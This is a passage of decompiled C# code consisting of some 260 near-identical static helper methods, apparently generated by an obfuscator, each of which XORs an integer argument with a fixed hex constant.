	[Obsolete("Exclude")]
	public static int smethod_1522(int int_4)
	{
		return int_4 ^ 0x3DC49ECE;
	}

	[Obsolete("Exclude")]
	public static int smethod_1523(int int_4)
	{
		return int_4 ^ 0x47702CD7;
	}

	[Obsolete("Exclude")]
	public static int smethod_1524(int int_4)
	{
		return int_4 ^ 0x28A4D356;
	}

	[Obsolete("Exclude")]
	public static int smethod_1525(int int_4)
	{
		return int_4 ^ 0x3B660AFF;
	}

	[Obsolete("Exclude")]
	public static int smethod_1526(int int_4)
	{
		return int_4 ^ 0x4C0B8D65;
	}

	[Obsolete("Exclude")]
	public static int smethod_1527(int int_4)
	{
		return int_4 ^ 0x75B2B90A;
	}

	[Obsolete("Exclude")]
	public static int smethod_1528(int int_4)
	{
		return int_4 ^ 0x66D363D4;
	}

	[Obsolete("Exclude")]
	public static int smethod_1529(int int_4)
	{
		return int_4 ^ 0x20006F8E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1530(int int_4)
	{
		return int_4 ^ 0x1A65CE99;
	}

	[Obsolete("Exclude")]
	public static int smethod_1531(int int_4)
	{
		return int_4 ^ 0x2FDB8E93;
	}

	[Obsolete("Exclude")]
	public static int smethod_1532(int int_4)
	{
		return int_4 ^ 0x247D74C9;
	}

	[Obsolete("Exclude")]
	public static int smethod_1533(int int_4)
	{
		return int_4 ^ 0xE48725E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1534(int int_4)
	{
		return int_4 ^ 0x2A0F57BD;
	}

	[Obsolete("Exclude")]
	public static int smethod_1535(int int_4)
	{
		return int_4 ^ 0x15FD27CB;
	}

	[Obsolete("Exclude")]
	public static int smethod_1536(int int_4)
	{
		return int_4 ^ 0x2C25358C;
	}

	[Obsolete("Exclude")]
	public static int smethod_1537(int int_4)
	{
		return int_4 ^ 0x24DA8F2;
	}

	[Obsolete("Exclude")]
	public static int smethod_1538(int int_4)
	{
		return int_4 ^ 0x5C132CEA;
	}

	[Obsolete("Exclude")]
	public static int smethod_1539(int int_4)
	{
		return int_4 ^ 0x6BB1EE88;
	}

	[Obsolete("Exclude")]
	public static int smethod_1540(int int_4)
	{
		return int_4 ^ 0x104462F5;
	}

	[Obsolete("Exclude")]
	public static int smethod_1541(int int_4)
	{
		return int_4 ^ 0x63D029A8;
	}

	[Obsolete("Exclude")]
	public static int smethod_1542(int int_4)
	{
		return int_4 ^ 0x797E6575;
	}

	[Obsolete("Exclude")]
	public static int smethod_1543(int int_4)
	{
		return int_4 ^ 0x63C35B11;
	}

	[Obsolete("Exclude")]
	public static int smethod_1544(int int_4)
	{
		return int_4 ^ 0x1727951B;
	}

	[Obsolete("Exclude")]
	public static int smethod_1545(int int_4)
	{
		return int_4 ^ 0x8E62A27;
	}

	[Obsolete("Exclude")]
	public static int smethod_1546(int int_4)
	{
		return int_4 ^ 0x10E917ED;
	}

	[Obsolete("Exclude")]
	public static int smethod_1547(int int_4)
	{
		return int_4 ^ 0x23A46658;
	}

	[Obsolete("Exclude")]
	public static int smethod_1548(int int_4)
	{
		return int_4 ^ 0x7DCA0339;
	}

	[Obsolete("Exclude")]
	public static int smethod_1549(int int_4)
	{
		return int_4 ^ 0x22EBF39F;
	}

	[Obsolete("Exclude")]
	public static int smethod_1550(int int_4)
	{
		return int_4 ^ 0x731C66A3;
	}

	[Obsolete("Exclude")]
	public static int smethod_1551(int int_4)
	{
		return int_4 ^ 0x21ABB825;
	}

	[Obsolete("Exclude")]
	public static int smethod_1552(int int_4)
	{
		return int_4 ^ 0x7FC9DB6;
	}

	[Obsolete("Exclude")]
	public static int smethod_1553(int int_4)
	{
		return int_4 ^ 0x2EC810AC;
	}

	[Obsolete("Exclude")]
	public static int smethod_1554(int int_4)
	{
		return int_4 ^ 0x30C16E6E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1555(int int_4)
	{
		return int_4 ^ 0xC58738;
	}

	[Obsolete("Exclude")]
	public static int smethod_1556(int int_4)
	{
		return int_4 ^ 0x1908C868;
	}

	[Obsolete("Exclude")]
	public static int smethod_1557(int int_4)
	{
		return int_4 ^ 0x6479ACA2;
	}

	[Obsolete("Exclude")]
	public static int smethod_1558(int int_4)
	{
		return int_4 ^ 0x12C886E7;
	}

	[Obsolete("Exclude")]
	public static int smethod_1559(int int_4)
	{
		return int_4 ^ 0x5EB3BDA2;
	}

	[Obsolete("Exclude")]
	public static int smethod_1560(int int_4)
	{
		return int_4 ^ 0x38467B6A;
	}

	[Obsolete("Exclude")]
	public static int smethod_1561(int int_4)
	{
		return int_4 ^ 0x8582E15;
	}

	[Obsolete("Exclude")]
	public static int smethod_1562(int int_4)
	{
		return int_4 ^ 0x7589EEEA;
	}

	[Obsolete("Exclude")]
	public static int smethod_1563(int int_4)
	{
		return int_4 ^ 0x22A79248;
	}

	[Obsolete("Exclude")]
	public static int smethod_1564(int int_4)
	{
		return int_4 ^ 0x406188CD;
	}

	[Obsolete("Exclude")]
	public static int smethod_1565(int int_4)
	{
		return int_4 ^ 0x5833EB56;
	}

	[Obsolete("Exclude")]
	public static int smethod_1566(int int_4)
	{
		return int_4 ^ 0xE7F1A9E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1567(int int_4)
	{
		return int_4 ^ 0x5DF809B5;
	}

	[Obsolete("Exclude")]
	public static int smethod_1568(int int_4)
	{
		return int_4 ^ 0x7CCBEF81;
	}

	[Obsolete("Exclude")]
	public static int smethod_1569(int int_4)
	{
		return int_4 ^ 0x50ACD8DD;
	}

	[Obsolete("Exclude")]
	public static int smethod_1570(int int_4)
	{
		return int_4 ^ 0x64898A28;
	}

	[Obsolete("Exclude")]
	public static int smethod_1571(int int_4)
	{
		return int_4 ^ 0x33F24BD9;
	}

	[Obsolete("Exclude")]
	public static int smethod_1572(int int_4)
	{
		return int_4 ^ 0xA41F352;
	}

	[Obsolete("Exclude")]
	public static int smethod_1573(int int_4)
	{
		return int_4 ^ 0x61F160E9;
	}

	[Obsolete("Exclude")]
	public static int smethod_1574(int int_4)
	{
		return int_4 ^ 0x1BA4427B;
	}

	[Obsolete("Exclude")]
	public static int smethod_1575(int int_4)
	{
		return int_4 ^ 0x724AE121;
	}

	[Obsolete("Exclude")]
	public static int smethod_1576(int int_4)
	{
		return int_4 ^ 0x15A9C749;
	}

	[Obsolete("Exclude")]
	public static int smethod_1577(int int_4)
	{
		return int_4 ^ 0x77620013;
	}

	[Obsolete("Exclude")]
	public static int smethod_1578(int int_4)
	{
		return int_4 ^ 0x4C1B0069;
	}

	[Obsolete("Exclude")]
	public static int smethod_1579(int int_4)
	{
		return int_4 ^ 0x7715ECA9;
	}

	[Obsolete("Exclude")]
	public static int smethod_1580(int int_4)
	{
		return int_4 ^ 0x5CDD10DB;
	}

	[Obsolete("Exclude")]
	public static int smethod_1581(int int_4)
	{
		return int_4 ^ 0x6D9CED9F;
	}

	[Obsolete("Exclude")]
	public static int smethod_1582(int int_4)
	{
		return int_4 ^ 0x3AA6399A;
	}

	[Obsolete("Exclude")]
	public static int smethod_1583(int int_4)
	{
		return int_4 ^ 0x67B1B2E6;
	}

	[Obsolete("Exclude")]
	public static int smethod_1584(int int_4)
	{
		return int_4 ^ 0x205E1B23;
	}

	[Obsolete("Exclude")]
	public static int smethod_1585(int int_4)
	{
		return int_4 ^ 0x172B2A2C;
	}

	[Obsolete("Exclude")]
	public static int smethod_1586(int int_4)
	{
		return int_4 ^ 0x5D9D2DA3;
	}

	[Obsolete("Exclude")]
	public static int smethod_1587(int int_4)
	{
		return int_4 ^ 0x23170DD5;
	}

	[Obsolete("Exclude")]
	public static int smethod_1588(int int_4)
	{
		return int_4 ^ 0x217E3946;
	}

	[Obsolete("Exclude")]
	public static int smethod_1589(int int_4)
	{
		return int_4 ^ 0x7A9733B2;
	}

	[Obsolete("Exclude")]
	public static int smethod_1590(int int_4)
	{
		return int_4 ^ 0x5DFA3BCA;
	}

	[Obsolete("Exclude")]
	public static int smethod_1591(int int_4)
	{
		return int_4 ^ 0x110F96C8;
	}

	[Obsolete("Exclude")]
	public static int smethod_1592(int int_4)
	{
		return int_4 ^ 0x28585C83;
	}

	[Obsolete("Exclude")]
	public static int smethod_1593(int int_4)
	{
		return int_4 ^ 0x31B73E9F;
	}

	[Obsolete("Exclude")]
	public static int smethod_1594(int int_4)
	{
		return int_4 ^ 0x6A2EFA93;
	}

	[Obsolete("Exclude")]
	public static int smethod_1595(int int_4)
	{
		return int_4 ^ 0x636F3575;
	}

	[Obsolete("Exclude")]
	public static int smethod_1596(int int_4)
	{
		return int_4 ^ 0x3E8791F2;
	}

	[Obsolete("Exclude")]
	public static int smethod_1597(int int_4)
	{
		return int_4 ^ 0x454FF455;
	}

	[Obsolete("Exclude")]
	public static int smethod_1598(int int_4)
	{
		return int_4 ^ 0x4FA7E6B3;
	}

	[Obsolete("Exclude")]
	public static int smethod_1599(int int_4)
	{
		return int_4 ^ 0x2A7FB9A5;
	}

	[Obsolete("Exclude")]
	public static int smethod_1600(int int_4)
	{
		return int_4 ^ 0x2AC39E0F;
	}

	[Obsolete("Exclude")]
	public static int smethod_1601(int int_4)
	{
		return int_4 ^ 0x4BD62DD5;
	}

	[Obsolete("Exclude")]
	public static int smethod_1602(int int_4)
	{
		return int_4 ^ 0x399D1CAC;
	}

	[Obsolete("Exclude")]
	public static int smethod_1603(int int_4)
	{
		return int_4 ^ 0x1260319;
	}

	[Obsolete("Exclude")]
	public static int smethod_1604(int int_4)
	{
		return int_4 ^ 0x662411BC;
	}

	[Obsolete("Exclude")]
	public static int smethod_1605(int int_4)
	{
		return int_4 ^ 0x327070EE;
	}

	[Obsolete("Exclude")]
	public static int smethod_1606(int int_4)
	{
		return int_4 ^ 0x1A4E0132;
	}

	[Obsolete("Exclude")]
	public static int smethod_1607(int int_4)
	{
		return int_4 ^ 0x5DD166D5;
	}

	[Obsolete("Exclude")]
	public static int smethod_1608(int int_4)
	{
		return int_4 ^ 0x2DACB17C;
	}

	[Obsolete("Exclude")]
	public static int smethod_1609(int int_4)
	{
		return int_4 ^ 0x15390C2D;
	}

	[Obsolete("Exclude")]
	public static int smethod_1610(int int_4)
	{
		return int_4 ^ 0x1D4ADD94;
	}

	[Obsolete("Exclude")]
	public static int smethod_1611(int int_4)
	{
		return int_4 ^ 0x5D39BCDB;
	}

	[Obsolete("Exclude")]
	public static int smethod_1612(int int_4)
	{
		return int_4 ^ 0x2D0C88A8;
	}

	[Obsolete("Exclude")]
	public static int smethod_1613(int int_4)
	{
		return int_4 ^ 0x64429C8;
	}

	[Obsolete("Exclude")]
	public static int smethod_1614(int int_4)
	{
		return int_4 ^ 0x70F74E35;
	}

	[Obsolete("Exclude")]
	public static int smethod_1615(int int_4)
	{
		return int_4 ^ 0x51918720;
	}

	[Obsolete("Exclude")]
	public static int smethod_1616(int int_4)
	{
		return int_4 ^ 0x7E4DA69F;
	}

	[Obsolete("Exclude")]
	public static int smethod_1617(int int_4)
	{
		return int_4 ^ 0x63DC99FE;
	}

	[Obsolete("Exclude")]
	public static int smethod_1618(int int_4)
	{
		return int_4 ^ 0x6A69E832;
	}

	[Obsolete("Exclude")]
	public static int smethod_1619(int int_4)
	{
		return int_4 ^ 0x70CF842F;
	}

	[Obsolete("Exclude")]
	public static int smethod_1620(int int_4)
	{
		return int_4 ^ 0x29757440;
	}

	[Obsolete("Exclude")]
	public static int smethod_1621(int int_4)
	{
		return int_4 ^ 0xF3BD076;
	}

	[Obsolete("Exclude")]
	public static int smethod_1622(int int_4)
	{
		return int_4 ^ 0x5E709754;
	}

	[Obsolete("Exclude")]
	public static int smethod_1623(int int_4)
	{
		return int_4 ^ 0x6AEF7732;
	}

	[Obsolete("Exclude")]
	public static int smethod_1624(int int_4)
	{
		return int_4 ^ 0x599B0751;
	}

	[Obsolete("Exclude")]
	public static int smethod_1625(int int_4)
	{
		return int_4 ^ 0x411C202C;
	}

	[Obsolete("Exclude")]
	public static int smethod_1626(int int_4)
	{
		return int_4 ^ 0x4A1B7480;
	}

	[Obsolete("Exclude")]
	public static int smethod_1627(int int_4)
	{
		return int_4 ^ 0x637FE58D;
	}

	[Obsolete("Exclude")]
	public static int smethod_1628(int int_4)
	{
		return int_4 ^ 0x34986EEF;
	}

	[Obsolete("Exclude")]
	public static int smethod_1629(int int_4)
	{
		return int_4 ^ 0x66E06D7B;
	}

	[Obsolete("Exclude")]
	public static int smethod_1630(int int_4)
	{
		return int_4 ^ 0x735FFB57;
	}

	[Obsolete("Exclude")]
	public static int smethod_1631(int int_4)
	{
		return int_4 ^ 0x74EDCD37;
	}

	[Obsolete("Exclude")]
	public static int smethod_1632(int int_4)
	{
		return int_4 ^ 0x759DA34E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1633(int int_4)
	{
		return int_4 ^ 0x456CBA27;
	}

	[Obsolete("Exclude")]
	public static int smethod_1634(int int_4)
	{
		return int_4 ^ 0x3F964240;
	}

	[Obsolete("Exclude")]
	public static int smethod_1635(int int_4)
	{
		return int_4 ^ 0x6F51F94E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1636(int int_4)
	{
		return int_4 ^ 0x1C827926;
	}

	[Obsolete("Exclude")]
	public static int smethod_1637(int int_4)
	{
		return int_4 ^ 0xC49717C;
	}

	[Obsolete("Exclude")]
	public static int smethod_1638(int int_4)
	{
		return int_4 ^ 0xB7871E2;
	}

	[Obsolete("Exclude")]
	public static int smethod_1639(int int_4)
	{
		return int_4 ^ 0x1A80828;
	}

	[Obsolete("Exclude")]
	public static int smethod_1640(int int_4)
	{
		return int_4 ^ 0x49936A36;
	}

	[Obsolete("Exclude")]
	public static int smethod_1641(int int_4)
	{
		return int_4 ^ 0x4072A092;
	}

	[Obsolete("Exclude")]
	public static int smethod_1642(int int_4)
	{
		return int_4 ^ 0xA7F482F;
	}

	[Obsolete("Exclude")]
	public static int smethod_1643(int int_4)
	{
		return int_4 ^ 0x228B3CC2;
	}

	[Obsolete("Exclude")]
	public static int smethod_1644(int int_4)
	{
		return int_4 ^ 0x7A49756D;
	}

	[Obsolete("Exclude")]
	public static int smethod_1645(int int_4)
	{
		return int_4 ^ 0x34D9F1E0;
	}

	[Obsolete("Exclude")]
	public static int smethod_1646(int int_4)
	{
		return int_4 ^ 0x5C0887A6;
	}

	[Obsolete("Exclude")]
	public static int smethod_1647(int int_4)
	{
		return int_4 ^ 0x2FC577ED;
	}

	[Obsolete("Exclude")]
	public static int smethod_1648(int int_4)
	{
		return int_4 ^ 0x4EFE6AC7;
	}

	[Obsolete("Exclude")]
	public static int smethod_1649(int int_4)
	{
		return int_4 ^ 0x31C40FF8;
	}

	[Obsolete("Exclude")]
	public static int smethod_1650(int int_4)
	{
		return int_4 ^ 0x60E21954;
	}

	[Obsolete("Exclude")]
	public static int smethod_1651(int int_4)
	{
		return int_4 ^ 0x66D85DAA;
	}

	[Obsolete("Exclude")]
	public static int smethod_1652(int int_4)
	{
		return int_4 ^ 0x731531FC;
	}

	[Obsolete("Exclude")]
	public static int smethod_1653(int int_4)
	{
		return int_4 ^ 0x4B11819B;
	}

	[Obsolete("Exclude")]
	public static int smethod_1654(int int_4)
	{
		return int_4 ^ 0x5119A5EB;
	}

	[Obsolete("Exclude")]
	public static int smethod_1655(int int_4)
	{
		return int_4 ^ 0x776D909A;
	}

	[Obsolete("Exclude")]
	public static int smethod_1656(int int_4)
	{
		return int_4 ^ 0x46142792;
	}

	[Obsolete("Exclude")]
	public static int smethod_1657(int int_4)
	{
		return int_4 ^ 0x5048568F;
	}

	[Obsolete("Exclude")]
	public static int smethod_1658(int int_4)
	{
		return int_4 ^ 0x7E1ABEB0;
	}

	[Obsolete("Exclude")]
	public static int smethod_1659(int int_4)
	{
		return int_4 ^ 0x5BCAC92F;
	}

	[Obsolete("Exclude")]
	public static int smethod_1660(int int_4)
	{
		return int_4 ^ 0x35EC04B8;
	}

	[Obsolete("Exclude")]
	public static int smethod_1661(int int_4)
	{
		return int_4 ^ 0x22BB3D46;
	}

	[Obsolete("Exclude")]
	public static int smethod_1662(int int_4)
	{
		return int_4 ^ 0x6EA1CC1A;
	}

	[Obsolete("Exclude")]
	public static int smethod_1663(int int_4)
	{
		return int_4 ^ 0x18753F4D;
	}

	[Obsolete("Exclude")]
	public static int smethod_1664(int int_4)
	{
		return int_4 ^ 0x55B6B793;
	}

	[Obsolete("Exclude")]
	public static int smethod_1665(int int_4)
	{
		return int_4 ^ 0x6624A916;
	}

	[Obsolete("Exclude")]
	public static int smethod_1666(int int_4)
	{
		return int_4 ^ 0x3A31AAF8;
	}

	[Obsolete("Exclude")]
	public static int smethod_1667(int int_4)
	{
		return int_4 ^ 0x1B79FEB6;
	}

	[Obsolete("Exclude")]
	public static int smethod_1668(int int_4)
	{
		return int_4 ^ 0x5EFE0721;
	}

	[Obsolete("Exclude")]
	public static int smethod_1669(int int_4)
	{
		return int_4 ^ 0x3047B1BD;
	}

	[Obsolete("Exclude")]
	public static int smethod_1670(int int_4)
	{
		return int_4 ^ 0x7552AB10;
	}

	[Obsolete("Exclude")]
	public static int smethod_1671(int int_4)
	{
		return int_4 ^ 0x10D854F5;
	}

	[Obsolete("Exclude")]
	public static int smethod_1672(int int_4)
	{
		return int_4 ^ 0x55F3EB84;
	}

	[Obsolete("Exclude")]
	public static int smethod_1673(int int_4)
	{
		return int_4 ^ 0x6DC8A7B1;
	}

	[Obsolete("Exclude")]
	public static int smethod_1674(int int_4)
	{
		return int_4 ^ 0x564867C3;
	}

	[Obsolete("Exclude")]
	public static int smethod_1675(int int_4)
	{
		return int_4 ^ 0x47E4A4C1;
	}

	[Obsolete("Exclude")]
	public static int smethod_1676(int int_4)
	{
		return int_4 ^ 0x5AF1C4F;
	}

	[Obsolete("Exclude")]
	public static int smethod_1677(int int_4)
	{
		return int_4 ^ 0x5373E47F;
	}

	[Obsolete("Exclude")]
	public static int smethod_1678(int int_4)
	{
		return int_4 ^ 0x1C30A15D;
	}

	[Obsolete("Exclude")]
	public static int smethod_1679(int int_4)
	{
		return int_4 ^ 0x636B9070;
	}

	[Obsolete("Exclude")]
	public static int smethod_1680(int int_4)
	{
		return int_4 ^ 0x557119A3;
	}

	[Obsolete("Exclude")]
	public static int smethod_1681(int int_4)
	{
		return int_4 ^ 0xB0CDCE7;
	}

	[Obsolete("Exclude")]
	public static int smethod_1682(int int_4)
	{
		return int_4 ^ 0x5356AC3B;
	}

	[Obsolete("Exclude")]
	public static int smethod_1683(int int_4)
	{
		return int_4 ^ 0x2A023E8F;
	}

	[Obsolete("Exclude")]
	public static int smethod_1684(int int_4)
	{
		return int_4 ^ 0x79B5D4D7;
	}

	[Obsolete("Exclude")]
	public static int smethod_1685(int int_4)
	{
		return int_4 ^ 0x2657D2D3;
	}

	[Obsolete("Exclude")]
	public static int smethod_1686(int int_4)
	{
		return int_4 ^ 0x92FE236;
	}

	[Obsolete("Exclude")]
	public static int smethod_1687(int int_4)
	{
		return int_4 ^ 0x111351C5;
	}

	[Obsolete("Exclude")]
	public static int smethod_1688(int int_4)
	{
		return int_4 ^ 0x43F7A49B;
	}

	[Obsolete("Exclude")]
	public static int smethod_1689(int int_4)
	{
		return int_4 ^ 0x2C3D66F5;
	}

	[Obsolete("Exclude")]
	public static int smethod_1690(int int_4)
	{
		return int_4 ^ 0x1D2EDDC;
	}

	[Obsolete("Exclude")]
	public static int smethod_1691(int int_4)
	{
		return int_4 ^ 0x589B1441;
	}

	[Obsolete("Exclude")]
	public static int smethod_1692(int int_4)
	{
		return int_4 ^ 0x204AA1A7;
	}

	[Obsolete("Exclude")]
	public static int smethod_1693(int int_4)
	{
		return int_4 ^ 0x345E4E95;
	}

	[Obsolete("Exclude")]
	public static int smethod_1694(int int_4)
	{
		return int_4 ^ 0x74E7D38F;
	}

	[Obsolete("Exclude")]
	public static int smethod_1695(int int_4)
	{
		return int_4 ^ 0xE11B5B8;
	}

	[Obsolete("Exclude")]
	public static int smethod_1696(int int_4)
	{
		return int_4 ^ 0xFA97134;
	}

	[Obsolete("Exclude")]
	public static int smethod_1697(int int_4)
	{
		return int_4 ^ 0x78D1A168;
	}

	[Obsolete("Exclude")]
	public static int smethod_1698(int int_4)
	{
		return int_4 ^ 0x317DBC72;
	}

	[Obsolete("Exclude")]
	public static int smethod_1699(int int_4)
	{
		return int_4 ^ 0x516D4FA2;
	}

	[Obsolete("Exclude")]
	public static int smethod_1700(int int_4)
	{
		return int_4 ^ 0x42B1BDEF;
	}

	[Obsolete("Exclude")]
	public static int smethod_1701(int int_4)
	{
		return int_4 ^ 0x54EE981C;
	}

	[Obsolete("Exclude")]
	public static int smethod_1702(int int_4)
	{
		return int_4 ^ 0x7D826127;
	}

	[Obsolete("Exclude")]
	public static int smethod_1703(int int_4)
	{
		return int_4 ^ 0x781D7545;
	}

	[Obsolete("Exclude")]
	public static int smethod_1704(int int_4)
	{
		return int_4 ^ 0x6F27154E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1705(int int_4)
	{
		return int_4 ^ 0x55E213A1;
	}

	[Obsolete("Exclude")]
	public static int smethod_1706(int int_4)
	{
		return int_4 ^ 0x4C4966D;
	}

	[Obsolete("Exclude")]
	public static int smethod_1707(int int_4)
	{
		return int_4 ^ 0xCF533C5;
	}

	[Obsolete("Exclude")]
	public static int smethod_1708(int int_4)
	{
		return int_4 ^ 0x6059D8A;
	}

	[Obsolete("Exclude")]
	public static int smethod_1709(int int_4)
	{
		return int_4 ^ 0x37CAB0B7;
	}

	[Obsolete("Exclude")]
	public static int smethod_1710(int int_4)
	{
		return int_4 ^ 0x3BB92CA7;
	}

	[Obsolete("Exclude")]
	public static int smethod_1711(int int_4)
	{
		return int_4 ^ 0x3E1618A1;
	}

	[Obsolete("Exclude")]
	public static int smethod_1712(int int_4)
	{
		return int_4 ^ 0x1428D161;
	}

	[Obsolete("Exclude")]
	public static int smethod_1713(int int_4)
	{
		return int_4 ^ 0xD89B6BF;
	}

	[Obsolete("Exclude")]
	public static int smethod_1714(int int_4)
	{
		return int_4 ^ 0x4D476D98;
	}

	[Obsolete("Exclude")]
	public static int smethod_1715(int int_4)
	{
		return int_4 ^ 0x1795E858;
	}

	[Obsolete("Exclude")]
	public static int smethod_1716(int int_4)
	{
		return int_4 ^ 0x3376A4BA;
	}

	[Obsolete("Exclude")]
	public static int smethod_1717(int int_4)
	{
		return int_4 ^ 0x11A4789F;
	}

	[Obsolete("Exclude")]
	public static int smethod_1718(int int_4)
	{
		return int_4 ^ 0xB7ED8C3;
	}

	[Obsolete("Exclude")]
	public static int smethod_1719(int int_4)
	{
		return int_4 ^ 0x467880CB;
	}

	[Obsolete("Exclude")]
	public static int smethod_1720(int int_4)
	{
		return int_4 ^ 0x1CF23FFB;
	}

	[Obsolete("Exclude")]
	public static int smethod_1721(int int_4)
	{
		return int_4 ^ 0x36689478;
	}

	[Obsolete("Exclude")]
	public static int smethod_1722(int int_4)
	{
		return int_4 ^ 0x6844690F;
	}

	[Obsolete("Exclude")]
	public static int smethod_1723(int int_4)
	{
		return int_4 ^ 0x7FFDBC6;
	}

	[Obsolete("Exclude")]
	public static int smethod_1724(int int_4)
	{
		return int_4 ^ 0x39486A0D;
	}

	[Obsolete("Exclude")]
	public static int smethod_1725(int int_4)
	{
		return int_4 ^ 0x70665F10;
	}

	[Obsolete("Exclude")]
	public static int smethod_1726(int int_4)
	{
		return int_4 ^ 0x5D15BB34;
	}

	[Obsolete("Exclude")]
	public static int smethod_1727(int int_4)
	{
		return int_4 ^ 0x2237018C;
	}

	[Obsolete("Exclude")]
	public static int smethod_1728(int int_4)
	{
		return int_4 ^ 0xDDD6C4A;
	}

	[Obsolete("Exclude")]
	public static int smethod_1729(int int_4)
	{
		return int_4 ^ 0x16937074;
	}

	[Obsolete("Exclude")]
	public static int smethod_1730(int int_4)
	{
		return int_4 ^ 0x5C425BD7;
	}

	[Obsolete("Exclude")]
	public static int smethod_1731(int int_4)
	{
		return int_4 ^ 0x61FAEA67;
	}

	[Obsolete("Exclude")]
	public static int smethod_1732(int int_4)
	{
		return int_4 ^ 0x693DE703;
	}

	[Obsolete("Exclude")]
	public static int smethod_1733(int int_4)
	{
		return int_4 ^ 0x10D9B8F3;
	}

	[Obsolete("Exclude")]
	public static int smethod_1734(int int_4)
	{
		return int_4 ^ 0x22C50A9D;
	}

	[Obsolete("Exclude")]
	public static int smethod_1735(int int_4)
	{
		return int_4 ^ 0x7173AE4D;
	}

	[Obsolete("Exclude")]
	public static int smethod_1736(int int_4)
	{
		return int_4 ^ 0x344442A7;
	}

	[Obsolete("Exclude")]
	public static int smethod_1737(int int_4)
	{
		return int_4 ^ 0x5749456D;
	}

	[Obsolete("Exclude")]
	public static int smethod_1738(int int_4)
	{
		return int_4 ^ 0x3A1F2D23;
	}

	[Obsolete("Exclude")]
	public static int smethod_1739(int int_4)
	{
		return int_4 ^ 0x47024BB0;
	}

	[Obsolete("Exclude")]
	public static int smethod_1740(int int_4)
	{
		return int_4 ^ 0x7CD004D3;
	}

	[Obsolete("Exclude")]
	public static int smethod_1741(int int_4)
	{
		return int_4 ^ 0x6DEBD2A8;
	}

	[Obsolete("Exclude")]
	public static int smethod_1742(int int_4)
	{
		return int_4 ^ 0x73567CC4;
	}

	[Obsolete("Exclude")]
	public static int smethod_1743(int int_4)
	{
		return int_4 ^ 0x5F4CC6AC;
	}

	[Obsolete("Exclude")]
	public static int smethod_1744(int int_4)
	{
		return int_4 ^ 0x3DB953D9;
	}

	[Obsolete("Exclude")]
	public static int smethod_1745(int int_4)
	{
		return int_4 ^ 0x2A538713;
	}

	[Obsolete("Exclude")]
	public static int smethod_1746(int int_4)
	{
		return int_4 ^ 0x186792D6;
	}

	[Obsolete("Exclude")]
	public static int smethod_1747(int int_4)
	{
		return int_4 ^ 0x57C77802;
	}

	[Obsolete("Exclude")]
	public static int smethod_1748(int int_4)
	{
		return int_4 ^ 0x28AC784C;
	}

	[Obsolete("Exclude")]
	public static int smethod_1749(int int_4)
	{
		return int_4 ^ 0x4967C0BD;
	}

	[Obsolete("Exclude")]
	public static int smethod_1750(int int_4)
	{
		return int_4 ^ 0x3EEDE9D5;
	}

	[Obsolete("Exclude")]
	public static int smethod_1751(int int_4)
	{
		return int_4 ^ 0x62BBA1C3;
	}

	[Obsolete("Exclude")]
	public static int smethod_1752(int int_4)
	{
		return int_4 ^ 0x4FE41BCD;
	}

	[Obsolete("Exclude")]
	public static int smethod_1753(int int_4)
	{
		return int_4 ^ 0x75EBCF02;
	}

	[Obsolete("Exclude")]
	public static int smethod_1754(int int_4)
	{
		return int_4 ^ 0x541631A5;
	}

	[Obsolete("Exclude")]
	public static int smethod_1755(int int_4)
	{
		return int_4 ^ 0x7FDC107B;
	}

	[Obsolete("Exclude")]
	public static int smethod_1756(int int_4)
	{
		return int_4 ^ 0x5D5811A1;
	}

	[Obsolete("Exclude")]
	public static int smethod_1757(int int_4)
	{
		return int_4 ^ 0x9C6FE87;
	}

	[Obsolete("Exclude")]
	public static int smethod_1758(int int_4)
	{
		return int_4 ^ 0x11AC0CDD;
	}

	[Obsolete("Exclude")]
	public static int smethod_1759(int int_4)
	{
		return int_4 ^ 0x41C187F;
	}

	[Obsolete("Exclude")]
	public static int smethod_1760(int int_4)
	{
		return int_4 ^ 0x2FD73F9E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1761(int int_4)
	{
		return int_4 ^ 0x115B4E00;
	}

	[Obsolete("Exclude")]
	public static int smethod_1762(int int_4)
	{
		return int_4 ^ 0x43F78B8B;
	}

	[Obsolete("Exclude")]
	public static int smethod_1763(int int_4)
	{
		return int_4 ^ 0x5AD0EE3;
	}

	[Obsolete("Exclude")]
	public static int smethod_1764(int int_4)
	{
		return int_4 ^ 0x195BACAB;
	}

	[Obsolete("Exclude")]
	public static int smethod_1765(int int_4)
	{
		return int_4 ^ 0x4D223507;
	}

	[Obsolete("Exclude")]
	public static int smethod_1766(int int_4)
	{
		return int_4 ^ 0x19D56049;
	}

	[Obsolete("Exclude")]
	public static int smethod_1767(int int_4)
	{
		return int_4 ^ 0x3401AEFC;
	}

	[Obsolete("Exclude")]
	public static int smethod_1768(int int_4)
	{
		return int_4 ^ 0x50AB378E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1769(int int_4)
	{
		return int_4 ^ 0x470B41DF;
	}

	[Obsolete("Exclude")]
	public static int smethod_1770(int int_4)
	{
		return int_4 ^ 0x54A83310;
	}

	[Obsolete("Exclude")]
	public static int smethod_1771(int int_4)
	{
		return int_4 ^ 0x44600A1F;
	}

	[Obsolete("Exclude")]
	public static int smethod_1772(int int_4)
	{
		return int_4 ^ 0x29164BD;
	}

	[Obsolete("Exclude")]
	public static int smethod_1773(int int_4)
	{
		return int_4 ^ 0x55073522;
	}

	[Obsolete("Exclude")]
	public static int smethod_1774(int int_4)
	{
		return int_4 ^ 0x13484A8A;
	}

	[Obsolete("Exclude")]
	public static int smethod_1775(int int_4)
	{
		return int_4 ^ 0x2391A5C8;
	}

	[Obsolete("Exclude")]
	public static int smethod_1776(int int_4)
	{
		return int_4 ^ 0x2EBB409F;
	}

	[Obsolete("Exclude")]
	public static int smethod_1777(int int_4)
	{
		return int_4 ^ 0x2C93C78F;
	}

	[Obsolete("Exclude")]
	public static int smethod_1778(int int_4)
	{
		return int_4 ^ 0x43914627;
	}

	[Obsolete("Exclude")]
	public static int smethod_1779(int int_4)
	{
		return int_4 ^ 0x3D1825DC;
	}

	[Obsolete("Exclude")]
	public static int smethod_1780(int int_4)
	{
		return int_4 ^ 0x44C143D8;
	}

	[Obsolete("Exclude")]
	public static int smethod_1781(int int_4)
	{
		return int_4 ^ 0x367F234E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1782(int int_4)
	{
		return int_4 ^ 0x6DC6F93F;
	}

